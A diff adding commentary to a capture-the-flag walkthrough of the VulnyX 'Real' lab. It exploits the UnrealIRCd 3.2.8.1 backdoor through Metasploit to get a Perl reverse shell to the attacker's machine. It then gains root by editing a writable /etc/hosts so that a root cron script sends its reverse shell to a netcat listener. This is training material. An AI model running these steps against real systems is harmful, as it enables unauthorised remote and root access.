@@ -72,6 +72,7 @@ Of the ports that we find open, 22, 80 and 6667 are the most interesting.
 
 ### Shell (server)
 #### 6667/TCP (UnrealIRCd)
+We detect that it is vulnerable with `nmap's irc-unrealircd-backdoor` NSE script.
 ```bash
 ┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
 └─$ nmap -p6667 --script="irc-unrealircd-backdoor" 192.168.100.120
@@ -99,7 +100,18 @@ UnrealIRCd 3.x - Remote Denial of Service     | windows/dos/27407.pl
 ---------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+This command searches the Exploit Database (EDB) for exploits related to UnrealIRCd. `searchsploit` is a CLI interface to exploitdb that allows you to search for vulnerabilities in the local database.
 #### Exploitation
+**Important exploit**: `16922.rb` (Metasploit)
+
+This is the most important find - a `backdoor` exploit in UnrealIRCd version 3.2.8.1. This version was distributed in 2009 with a `backdoor` embedded in the offical distribution. Through the exploit, we can connect to an IRC server via TCP and excecute any commnand.
+
+**Exploit features***:
+- Remote Code Execution (RCE) capability.
+- A command in the format `AB; <command>` is sent to the IRC server via TCP.
+- Metasploit module is available `exploit/unix/irc/unreal_ircd_3281_backdoor`.
+
+Now we will implement this payload in `metasploit`. Let's run `metasploit`.
 ```bash
 ┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
 └─$ msfconsole
@@ -116,7 +128,9 @@ The Metasploit Framework is a Rapid7 Open Source Project
 
 msf > 
 ```
-
+We configure parameters:
+- `set RHOSTS 192.168.100.120`: IP address of the target machine.
+- `set RPORT 6667`: IRC server port.
 ```bash
 msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.100.120
@@ -151,7 +165,7 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 ```
-
+This command `show payloads` shows what kind of shell can be obtained through the exploit.
 ```bash
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
 
@@ -173,7 +187,13 @@ Compatible Payloads
    10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
    11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
    12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
-   
+```
+Select reverse shell: `set PAYLOAD cmd/unix/reverse_perl`. Why `reverse_perl`? 
+- Target machine connect back to you (good for firewalls).
+- Provides shell via `Perl`.
+- Works on most Linux systems.
+- Lightweight, simple and easy to deploy.
+```bash
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD payload/cmd/unix/reverse_perl
 PAYLOAD => cmd/unix/reverse_perl
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.100.173
@@ -181,6 +201,9 @@ LHOST => 192.168.100.173
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 4444
 LPORT => 4444
 ```
+We configure listener:
+- `set LHOST 192.168.100.173`: Our IP address (Kali machine).
+- `set LPORT 4444`: Our port (shell comes here).
 
 ```bash
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
@@ -221,6 +244,7 @@ Exploit target:
 View the full module info with the info, or info -d command.
 ```
 #### Reverse Shell
+We successfully got a shell using all the settings we chose above the `exploit` command.
 ```bash
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
 [*] Started reverse TCP handler on 192.168.100.173:4444 
@@ -238,9 +262,11 @@ server
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 server@real:~/irc/Unreal3.2$ 
 ```
+We improved the shell to make the shell look more user-friendly.
 
 ### Privilege Escalation
 #### Enumeration
+We use `pspy` to monitor **tasks** and **processes** that may be running on the system. We download and install it on the target machine's shell.
 ```bash
 server@real:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
 ...
@@ -263,6 +289,7 @@ drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .Test-unix
 drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .X11-unix
 drwxrwxrwt  2 root   root      4096 Feb 25 01:30 .XIM-unix
 ```
+We dectect that every minute the `root` user (UID=0) executes the `/opt/task` script.
 ```bash
 server@real:/tmp$ ./pspy64
 ./pspy64
@@ -295,6 +322,7 @@ Draining file system events due to startup...
 2026/02/25 09:24:01 CMD: UID=0     PID=5004   | /bin/bash /opt/task 
 2026/02/25 09:24:01 CMD: UID=0     PID=5005   | /bin/bash /opt/task 
 ```
+We analyze `/opt/task` and see that it sends a ping to the **domain shelly.real.nyx**, if that domain is alive it will send a reverse shell to that domain through `port 65000/TCP`
 ```bash
 server@real:/tmp$ cd /opt
 cd /opt
@@ -321,6 +349,7 @@ function check(){
 check
 ```
 #### Abuse
+Using the following command, we can search for writable files.
 ```bash
 server@real:~$ find / -type f -writable 2>/dev/null | grep -v "proc" | grep -v "sys"
 <itable 2>/dev/null | grep -v "proc" | grep -v "sys"
@@ -339,6 +368,7 @@ server@real:~$ find / -type f -writable 2>/dev/null | grep -v "proc" | grep -v "
 /home/server/.bash_logout
 /etc/hosts
 ```
+We have write permissions on the `/etc/hosts` file.
 ```bash
 server@real:/opt$ cat /etc/hosts
 cat /etc/hosts
@@ -350,6 +380,7 @@ cat /etc/hosts
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
+We add the **domain shelly.real.nyx** to point to my local IP.
 ```bash
 server@real:~$ echo '192.168.100.173 shelly.real.nyx' >> /etc/hosts
 echo '192.168.100.173 shelly.real.nyx' >> /etc/hosts
@@ -364,6 +395,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 192.168.100.173 shelly.real.nyx
 ```
+We listen on `port 65000` and get a shell as `root`.
 ```bash
 ┌──(dungcngo㉿kali)-[~/…/walkthroughs/vulnyx/low-difficulty/real]
 └─$ nc -lvnp 65000
@@ -376,6 +408,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 root@real:~#   
 ```
 #### Flags
+As a `root` user, we can read the flags `user.txt` and `root.txt`.
 ```bash
 root@real:~# find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
 find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
